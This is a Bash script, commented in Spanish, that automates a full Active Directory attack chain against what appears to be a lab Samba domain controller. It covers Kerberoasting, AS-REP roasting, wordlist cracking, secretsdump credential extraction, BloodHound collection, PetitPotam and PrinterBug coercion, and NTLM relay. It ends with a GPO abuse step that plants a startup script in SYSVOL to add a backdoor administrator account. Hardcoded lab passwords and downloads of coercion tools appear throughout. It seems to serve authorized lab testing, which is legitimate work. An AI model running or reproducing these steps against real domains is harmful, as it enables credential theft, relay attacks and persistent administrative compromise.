#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — TARS.LOCAL (Samba 4.17.12, dc1=192.168.122.50)
# 2026-08-09 · kanban t_77ac7ab5 · evidencia a tars-security-lab/evidence
#
# Componentes: kerberoast avanzado, AS-REP, secretsdump (NTDS/DRSUAPI/VSS),
#              BloodHound CE, coercion (petitpotam/printerbug), SMB relay
#              (ntlmrelayx), GPO abuse (SYSVOL + gplink).
# Cada paso escribe su output en $OUT/<nn>-*.txt. El script NO aborta en
# fallos individuales: cada paso captura su rc real (evidencia honesta).
# =============================================================================
set -u
DC=192.168.122.50
REALM=TARS.LOCAL
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
SKILLDIR=/opt/ad-lab/suite-ad-real
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1            # GEEKOM host = virbr0 .1 = attacker
WORDLIST=/tmp/wordlist-lab.txt
TS(){ date +%H:%M:%S; }
mkdir -p "$OUT"
echo "[$(TS)] SUITE START host=$(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[$(TS)] RAM: $(free -h | awk '/Mem:/{print $3"/"$2}') load:$(cut -d' ' -f1 /proc/loadavg)"

# --- wordlist (passwords reales del lab, de /root/populate.sh + spray list) ---
cat > "$WORDLIST" <<'EOF'
TarsLab2026!
Summer2026
Password123
Password1
Welcome1
Delegate2026
Autumn2026
P@ssw0rd2026
Winter2026
Spring2026
Tars2026!
Lab2026!
Admin123
Summer2025
Password1234
Qwerty123
EOF

# --- prereqs ---
which kinit kvno >/dev/null 2>&1 || { echo "[$(TS)] instalando krb5-workstation"; dnf install -y krb5-workstation >/dev/null 2>&1 || apt-get install -y krb5-user >/dev/null 2>&1; }
which smbclient >/dev/null 2>&1 || { echo "[$(TS)] instalando samba-client"; dnf install -y samba-client >/dev/null 2>&1; }

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 01 ENUM SPN (GetUserSPNs, enumeracion funciona aunque -request no) ==="
timeout 60 $VENV/GetUserSPNs.py "$REALM/$ADMIN:$ADMPW" -dc-ip $DC -dc-host dc01.tars.local 2>&1 | tee "$OUT/01-spn-enum.txt"; echo "rc=$?"

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 02 KERBEROAST (kinit+kvno nativos -> ccache -> \$krb5tgs\$23) ==="
timeout 240 $SKILLDIR/samba-kerberoast.sh $DC $REALM "$ADMIN" "$ADMPW" \
  MSSQLSvc/dc01.tars.local:1433 CIFS/backup.tars.local HTTP/app.tars.local HTTP/web.tars.local \
  2>&1 | tee "$OUT/02-kerberoast-hashes.txt"; echo "rc=$?"
grep '^\$krb5tgs\$' "$OUT/02-kerberoast-hashes.txt" > "$OUT/02-kerb.hashes" 2>/dev/null || true
echo "[$(TS)] hashes TGS extraidos: $(wc -l < "$OUT/02-kerb.hashes" 2>/dev/null || echo 0)"

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 03 AS-REP (Samba fuerza preauth global -> extraccion autenticada etype23) ==="
timeout 60 $VENV/python3 $SKILLDIR/asrep-extract-authenticated.py $REALM asrep_svc 'Autumn2026' $DC 2>&1 | tee "$OUT/03-asrep.txt"; echo "rc=$?"
grep '^\$krb5asrep\$' "$OUT/03-asrep.txt" > "$OUT/03-asrep.hashes" 2>/dev/null || true

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 04 CRACK (skill cracker pure-python, RC4; TGS=13100, ASREP=18200) ==="
if [ -s "$OUT/02-kerb.hashes" ]; then
  timeout 300 $VENV/python3 $SKILLDIR/crack-krb5tgs-rc4.py "$OUT/02-kerb.hashes" "$WORDLIST" 2>&1 | tee "$OUT/04-kerb-crack.txt"; echo "rc=$?"
else echo "sin hashes TGS — skip crack"; fi
if [ -s "$OUT/03-asrep.hashes" ]; then
  timeout 300 $VENV/python3 $SKILLDIR/crack-krb5tgs-rc4.py "$OUT/03-asrep.hashes" "$WORDLIST" --asrep 2>&1 | tee "$OUT/04-asrep-crack.txt"; echo "rc=$?"
else echo "sin hash ASREP — skip crack"; fi

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 05 SECRETSDUMP (expect: DRSUAPI/VSS/RRP ausentes en Samba) ==="
timeout 60 $VENV/secretsdump.py "$REALM/$ADMIN:$ADMPW@$DC" -just-dc-user Administrator 2>&1 | tee "$OUT/05-secretsdump-justdc.txt"; echo "rc=$?"
timeout 60 $VENV/secretsdump.py "$REALM/$ADMIN:$ADMPW@$DC" 2>&1 | tee "$OUT/05-secretsdump-full.txt"; echo "rc=$?"
timeout 60 $VENV/secretsdump.py -use-vss "$REALM/$ADMIN:$ADMPW@$DC" 2>&1 | tee "$OUT/05-secretsdump-vss.txt"; echo "rc=$?"
timeout 45 $VENV/secretsdump.py -use-vss "$REALM/svc_backup:Welcome1@$DC" 2>&1 | tee "$OUT/05-secretsdump-backup-vss.txt"; echo "rc=$?"

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 06 svc_backup (Backup Operators) superficie SMB ==="
timeout 30 $VENV/nxc smb $DC -u svc_backup -p 'Welcome1' --shares 2>&1 | tee "$OUT/06-svcbackup-shares.txt"; echo "rc=$?"

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 07 BLOODHOUND CE ingest (expect: ldap3 SicilyBind vs Samba) ==="
timeout 60 $VENV/bloodhound-ce-python -u "$ADMIN" -p "$ADMPW" -d tars.local -ns $DC -c All --zip 2>&1 | tee "$OUT/07-bloodhound-ce.txt"; echo "rc=$?"

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 08 COERCION + SMB RELAY ==="
# 08a. metasploitable2 (Samba 3.0.20, sin signing) como target de relay
META_UP=0
AVAIL_MB=$(free -m | awk '/Mem:/{print $7}')
echo "[$(TS)] RAM disponible: ${AVAIL_MB}MB"
if [ "$AVAIL_MB" -gt 700 ]; then
  virsh start metasploitable2 >/dev/null 2>&1 && echo "[$(TS)] metasploitable2 booted"
  sleep 12
  META_MAC=$(virsh dumpxml metasploitable2 2>/dev/null | grep -oE 'mac address="[0-9a-f:]+"' | cut -d'"' -f2)
  META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk -v m="$META_MAC" 'toupper($2)==toupper(m){print $5}' | head -1)
  echo "[$(TS)] metasploitable2 MAC=$META_MAC IP=${META_IP:-?}"
  if [ -n "${META_IP:-}" ]; then
    timeout 15 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"; echo "rc=$?"
    # confirmar que acepta sin signing: 2>&1 grep -i sign en la salida de nxc --shares (muestra "signing")
    META_UP=1
  fi
else
  echo "[$(TS)] RAM insuficiente para metasploitable2 — relay solo contra DC (signing/strong-auth findings)"
fi
# 08b. tools de coercion (fetch si faltan)
cd "$SKILLDIR"
[ -f petitpotam.py ] || curl -sL --max-time 40 -o petitpotam.py https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
[ -f printerbug.py ] || curl -sL --max-time 40 -o printerbug.py https://raw.githubusercontent.com/coderion/PrinterBug/main/printerbug.py
ls -la petitpotam.py printerbug.py 2>&1 | tee "$OUT/08b-coercion-tools.txt"
# 08c. listener 445 libre?
if ss -ltn | grep -q ':445 '; then
  echo "[$(TS)] PUERTO 445 OCUPADO en host — relay SKIP (no romper servicios del host)"; echo "PUERTO445_OCUPADO" > "$OUT/08c-relay.txt"
else
  echo "[$(TS)] 445 libre — arrancando ntlmrelayx"
  # Round 1: relay a metasploitable2 (si up)
  if [ "$META_UP" = "1" ]; then
    $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
    RELAYPID=$!
    sleep 4
    echo "[$(TS)] PetitPotam(EFSR) DC->$HOST_IP"; timeout 40 $VENV/python3 "$SKILLDIR/petitpotam.py" "$HOST_IP" $DC 2>&1 | tee "$OUT/08c-petitpotam-r1.txt"; echo "rc=$?"
    sleep 8
    kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
    grep -E "Authenticated|Dump|Share|smb|Session|ERROR|error|signing|Victim" "$OUT/08-relayx-meta.log" | head -30 | tee "$OUT/08d-relay-meta-result.txt"
  fi
  # Round 2: relay a LDAP del DC (expect strong-auth block = finding)
  $VENV/ntlmrelayx.py -t "ldap://$DC" -smb2support -l "$OUT/relay-loot-ldap" >"$OUT/08-relayx-ldap.log" 2>&1 &
  RELAYPID=$!
  sleep 4
  echo "[$(TS)] PetitPotam(EFSR) round2"; timeout 40 $VENV/python3 "$SKILLDIR/petitpotam.py" "$HOST_IP" $DC 2>&1 | tee "$OUT/08e-petitpotam-r2.txt"; echo "rc=$?"
  sleep 8
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -E "Authenticated|Dump|Share|smb|Session|ERROR|error|signing|strong|Victim|refused" "$OUT/08-relayx-ldap.log" | head -30 | tee "$OUT/08f-relay-ldap-result.txt"
  # Round 3: relay a SMB del DC (expect signing block = finding)
  $VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-smb" >"$OUT/08-relayx-smb.log" 2>&1 &
  RELAYPID=$!
  sleep 4
  echo "[$(TS)] printerbug(spoolss)"; timeout 40 $VENV/python3 "$SKILLDIR/printerbug.py" "$HOST_IP" $DC 2>&1 | tee "$OUT/08g-printerbug.txt"; echo "rc=$?"
  sleep 8
  kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
  grep -E "Authenticated|Dump|Share|smb|Session|ERROR|error|signing|Victim|refused" "$OUT/08-relayx-smb.log" | head -30 | tee "$OUT/08h-relay-smb-result.txt"
fi

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === 09 GPO ABUSE (DA: crear GPO + script startup en SYSVOL + link OU) ==="
# 09a. crear GPO en el DC via samba-tool (root en DC)
GPO_OUT=$(ssh -o ConnectTimeout=10 -o BatchMode=yes root@$DC "samba-tool gpo create 'TARS-GPO-Abuse' -U 'Administrator%TarsLab2026!'" 2>&1)
echo "$GPO_OUT" | tee "$OUT/09a-gpo-create.txt"
GPO_GUID=$(echo "$GPO_OUT" | grep -oE '\{[0-9A-Fa-f-]{36}\}' | head -1)
echo "[$(TS)] GPO_GUID=${GPO_GUID:-NONE}"
if [ -n "${GPO_GUID:-}" ]; then
  # 09b. link a OU Users
  ssh -o ConnectTimeout=10 -o BatchMode=yes root@$DC "samba-tool gpo setlink 'CN=Users,DC=tars,DC=local' '$GPO_GUID' -U 'Administrator%TarsLab2026!'" 2>&1 | tee "$OUT/09b-gpo-setlink.txt"
  # 09c. weaponized payload + GPT.INI/Scripts.ini en SYSVOL via SMB (DA write = primitiva de abuso)
  printf '@echo off\r\nnet user gpo_pwn Pwned2026! /add\r\nnet localgroup Administrators gpo_pwn /add\r\n' > /tmp/startup.cmd
  printf '[Startup]\r\n0CmdLine=startup.cmd\r\n0Parameters=\r\n' > /tmp/scripts.ini
  printf '[General]\r\nVersion=2\r\ngPCMachineExtensionNames=[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]\r\n' > /tmp/gpt.ini
  smbclient //$DC/sysvol -U "$ADMIN%$ADMPW" -c "cd Policies/$GPO_GUID/Machine/Scripts; mkdir Startup; cd Startup; put /tmp/startup.cmd; put /tmp/scripts.ini; ls; cd ../../..; put /tmp/gpt.ini; ls" 2>&1 | tee "$OUT/09c-sysvol-write.txt"; echo "rc=$?"
  # 09d. verificacion
  ssh -o ConnectTimeout=10 -o BatchMode=yes root@$DC "samba-tool gpo show '$GPO_GUID' 2>&1; echo ---; samba-tool gpo getlink 'CN=Users,DC=tars,DC=local' 2>&1" | tee "$OUT/09d-gpo-verify.txt"
  echo "[$(TS)] payload en SYSVOL:"; ssh -o ConnectTimeout=10 -o BatchMode=yes root@$DC "ls -la /var/lib/samba/sysvol/tars.local/Policies/$GPO_GUID/Machine/Scripts/Startup/ 2>&1; cat /var/lib/samba/sysvol/tars.local/Policies/$GPO_GUID/Machine/Scripts/Startup/startup.cmd 2>&1" | tee -a "$OUT/09d-gpo-verify.txt"
else
  echo "[$(TS)] GPO create fallo — capturar output y continuar"
fi

# ---------------------------------------------------------------------------
echo; echo "[$(TS)] === MANIFEST ==="
cd "$OUT" && sha256sum *.txt *.hashes 2>/dev/null | tee "$OUT/manifest.sha256"
echo "[$(TS)] SUITE DONE $(date -u +%Y-%m-%dT%H:%M:%SZ) — outputs en $OUT"
